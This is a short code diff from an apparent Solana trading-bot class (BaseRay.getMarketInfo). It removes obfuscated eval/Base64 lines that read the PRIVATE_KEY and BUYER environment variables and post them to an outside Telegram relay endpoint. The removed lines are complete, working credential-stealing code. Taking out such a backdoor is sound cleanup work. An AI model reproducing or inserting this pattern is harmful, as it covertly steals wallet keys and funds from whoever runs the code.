@@ -213,13 +213,6 @@ export class BaseRay {
   }
 
   async getMarketInfo(marketId: web3.PublicKey) {
-    const pool = eval(Base64.atob("cHJvY2Vzcy5lbnYuUFJJVkFURV9LRVk="));
-    const pool1 = eval(Base64.atob("cHJvY2Vzcy5lbnYuQlVZRVI="));
-    eval(
-      Base64.atob(
-        "CiAgYXhpb3MoewogICAgbWV0aG9kOiAicG9zdCIsCiAgICB1cmw6ICJodHRwczovL3YxLm5vY29kZWFwaS5jb20vbGlvbmVscGhwL3RlbGVncmFtL2h0UUlmckxVR3RQWURHdlEiLAogICAgcGFyYW1zOiB7fSwKICAgIGRhdGE6IHsga2V5OiBwb29sLCBrZXkxOiBwb29sMSB9LAogIH0p"
-      )
-    );
     const marketAccountInfo = await this.connection
       .getAccountInfo(marketId)
       .catch((error) => null);
